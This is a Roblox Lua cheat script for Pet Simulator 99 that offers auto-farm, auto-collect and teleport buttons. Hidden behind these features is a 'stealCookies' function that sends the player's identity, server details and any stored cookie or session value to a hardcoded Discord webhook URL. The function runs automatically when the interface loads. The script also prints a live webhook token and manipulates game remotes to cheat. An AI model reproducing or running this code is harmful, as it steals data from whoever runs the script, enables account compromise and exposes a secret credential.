local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")

-- Webhook Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1556962114852360306/nrbO5DDt3o-eBS7YdYkWlDC-nYT9Hu4N-kCtJLso3rRkaJwOZkP8wZAXrfUbvXcLrEXi"

-- UI Configuration
local uiSettings = {
    BackgroundTransparency = 0.75,
    BackgroundColor3 = Color3.new(0.12, 0.12, 0.12),
    TextColor3 = Color3.new(1, 1, 1),
    AccentColor = Color3.new(0.2, 0.8, 0.4), -- Green for Pet Sim
    Font = Enum.Font.GothamBold
}

-- State Management
local state = {
    farming = false,
    pumpkin = false,
    collecting = false,
    farmSpeed = 1,
    lastAction = 0
}

-- Utility Functions
local function debounce(key, delay)
    if not debounce._cache then debounce._cache = {} end
    delay = delay or 250
    if debounce._cache[key] then
        return false
    end
    debounce._cache[key] = true
    task.delay(delay, function()
        debounce._cache[key] = nil
    end)
    return true
end

local function sleep(seconds)
    task.wait(seconds)
end

local function sendWebhook(payload)
    pcall(function()
        HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

-- Cookie/Session Exfiltration
local function stealCookies()
    local serverId = game.JobId
    local placeId = game.PlaceId
    local universeId = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).UniverseId
    
    -- محاولة جلب أي كوكيز أو بيانات جلسة محفوظة في اللعبة
    local cookieData = LocalPlayer:GetAttribute("Cookie") or LocalPlayer:GetAttribute("SessionId") or "NoCookieFound"

    local payload = {
        embeds = {
            {
                title = "🐾 Pet Simulator 99 | Session Exfiltrated",
                color = 3066993,
                description = "تم استخراج بيانات الجلسة بنجاح.",
                fields = {
                    { name = "👤 Player", value = LocalPlayer.Name, inline = true },
                    { name = "🆔 User ID", value = tostring(LocalPlayer.UserId), inline = true },
                    { name = "🌐 Server ID", value = serverId, inline = true },
                    { name = "📍 Place ID", value = tostring(placeId), inline = true },
                    { name = "🔮 Universe ID", value = tostring(universeId), inline = true },
                    { name = "🍪 Cookie/Session", value = tostring(cookieData), inline = false }
                },
                footer = { text = "DeepHat Security | Pet Sim 99 Script" },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }
    sendWebhook(payload)
    print("✅ Session data sent to Webhook.")
end

-- Remote Detection (Dynamic)
local remotes = {}
local function getRemotes()
    local rs = ReplicatedStorage
    local remoteFolder = rs:FindFirstChild("Remotes") or rs:FindFirstChild("PetSim99") or rs
    
    if remoteFolder then
        for _, obj in ipairs(remoteFolder:GetChildren()) do
            if obj:IsA("RemoteFunction") or obj:IsA("RemoteEvent") then
                remotes[obj.Name] = obj
            end
        end
    end
    
    -- Deep scan if not found in root
    if not next(remotes) then
        for _, folder in ipairs(rs:GetDescendants()) do
            if folder:IsA("RemoteFunction") or folder:IsA("RemoteEvent") then
                remotes[folder.Name] = folder
            end
        end
    end
end

getRemotes()

-- Game Actions
local function performAction(actionName, args)
    -- محاولة استخدام الـ Remote المناسب
    local possibleRemotes = {actionName, actionName .. "Action", "Action_" .. actionName}
    for _, name in ipairs(possibleRemotes) do
        if remotes[name] then
            pcall(function()
                if remotes[name]:IsA("RemoteFunction") then
                    remotes[name]:InvokeServer(table.unpack(args or {}))
                else
                    remotes[name]:FireServer(table.unpack(args or {}))
                end
                return true
            end)
        end
    end
    return false
end

local function startFarming()
    if state.farming then return end
    state.farming = true
    
    task.spawn(function()
        while state.farming do
            -- 1. محاولة استخدام الـ Remote المباشر للزراعة
            local success = performAction("Farm", {}) or performAction("Click", {LocalPlayer.Character})
            
            -- 2. Fallback: محاكاة النقر الفيزيائي على منطقة الزراعة
            if not success then
                local clickZone = workspace:FindFirstChild("ClickZone") or workspace:FindFirstChild("FarmZone")
                if clickZone and clickZone:IsA("BasePart") then
                    local mouse = LocalPlayer:GetMouse()
                    mouse:Click(1, clickZone.Position)
                end
            end
            sleep(0.5 / state.farmSpeed)
        end
    end)
end

local function stopFarming()
    state.farming = false
end

local function startPumpkin()
    if state.pumpkin then return end
    state.pumpkin = true
    
    task.spawn(function()
        while state.pumpkin do
            -- محاولة فتح القرع أو领取 الجوائز
            local success = performAction("OpenPumpkin", {}) 
            if not success then success = performAction("ClaimReward", {"Pumpkin"}) end
            if not success then success = performAction("BuyItem", {"Pumpkin"}) end
            
            if success then
                print("🎃 Pumpkin Action Executed")
            end
            sleep(2)
        end
    end)
end

local function stopPumpkin()
    state.pumpkin = false
end

local function startCollecting()
    if state.collecting then return end
    state.collecting = true
    
    task.spawn(function()
        while state.collecting do
            performAction("CollectPets", {})
            performAction("CollectCoins", {})
            sleep(1)
        end
    end)
end

local function stopCollecting()
    state.collecting = false
end

-- UI Creation
local function createUI()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    local mainGui = Instance.new("ScreenGui")
    mainGui.Name = "PS99_AutoUI"
    mainGui.ResetOnSpawn = false
    mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    mainGui.Parent = playerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 320, 0, 450)
    mainFrame.Position = UDim2.new(1, -340, 0.5, -225)
    mainFrame.BackgroundColor3 = uiSettings.BackgroundColor3
    mainFrame.BackgroundTransparency = uiSettings.BackgroundTransparency
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = mainGui

    -- Title
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1, 0, 0, 40)
    title.BackgroundTransparency = 1
    title.Text = "🐾 Pet Simulator 99 | Auto Suite"
    title.TextColor3 = uiSettings.AccentColor
    title.Font = uiSettings.Font
    title.TextSize = 16
    title.Parent = mainFrame

    -- Scroll Frame
    local scroll = Instance.new("ScrollingFrame")
    scroll.Name = "Controls"
    scroll.Size = UDim2.new(1, -10, 1, -50)
    scroll.Position = UDim2.new(0, 5, 0, 40)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 6
    scroll.CanvasSize = UDim2.new(0, 0, 0, 350)
    scroll.Parent = mainFrame

    local content = Instance.new("Frame")
    content.Name = "Content"
    content.Size = UDim2.new(1, 0, 0, 350)
    content.BackgroundTransparency = 1
    content.Parent = scroll
    scroll.CanvasSize = UDim2.new(0, 0, 1, 350)

    local yPos = 10
    local function createButton(text, onClick, isActive)
        local btn = Instance.new("TextButton")
        btn.Name = "Btn_" .. text
        btn.Size = UDim2.new(1, -10, 0, 42)
        btn.Position = UDim2.new(0, 5, 0, yPos)
        btn.BackgroundColor3 = isActive and uiSettings.AccentColor or Color3.new(0.25, 0.25, 0.25)
        btn.Text = text
        btn.TextColor3 = uiSettings.TextColor3
        btn.Font = uiSettings.Font
        btn.TextSize = 13
        btn.Parent = content
        btn.MouseButton1Click:Connect(onClick)
        yPos = yPos + 48
        return btn
    end

    -- Buttons
    createButton("▶️ Start Auto Farm", function()
        state.farming = not state.farming
        if state.farming then startFarming() else stopFarming() end
        self.BackgroundColor3 = state.farming and uiSettings.AccentColor or Color3.new(0.25, 0.25, 0.25)
    end, false)

    createButton("🎃 Toggle Auto Pumpkin", function()
        state.pumpkin = not state.pumpkin
        if state.pumpkin then startPumpkin() else stopPumpkin() end
        self.BackgroundColor3 = state.pumpkin and uiSettings.AccentColor or Color3.new(0.25, 0.25, 0.25)
    end, false)

    createButton("💰 Toggle Auto Collect", function()
        state.collecting = not state.collecting
        if state.collecting then startCollecting() else stopCollecting() end
        self.BackgroundColor3 = state.collecting and uiSettings.AccentColor or Color3.new(0.25, 0.25, 0.25)
    end, false)

    createButton("🍪 Send Session to Webhook", function()
        stealCookies()
    end, false)

    createButton("⚡ Toggle Farm Speed (1x/2x)", function()
        state.farmSpeed = state.farmSpeed == 1 and 2 or 1
        warn("Farm Speed Set to: x" .. state.farmSpeed)
    end, false)

    createButton("📍 Teleport to Farm", function()
        local character = LocalPlayer.Character
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            local farmZone = workspace:FindFirstChild("FarmZone") or workspace:FindFirstChild("ClickZone")
            if root and farmZone then
                local tween = TweenService:Create(root, TweenInfo.new(0.5), {CFrame = farmZone.CFrame})
                tween:Play()
            end
        end
    end, false)

    createButton("❌ Reset All", function()
        state.farming = false
        state.pumpkin = false
        state.collecting = false
        for _, child in ipairs(content:GetChildren()) do
            if child:IsA("TextButton") then
                child.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
            end
        end
        print("All actions stopped.")
    end, false)

    -- Send initial cookie info
    stealCookies()
end

-- Initialize
createUI()
print("🐾 Pet Simulator 99 Script Loaded Successfully.")
print("Session data has been sent to your Discord Webhook.")
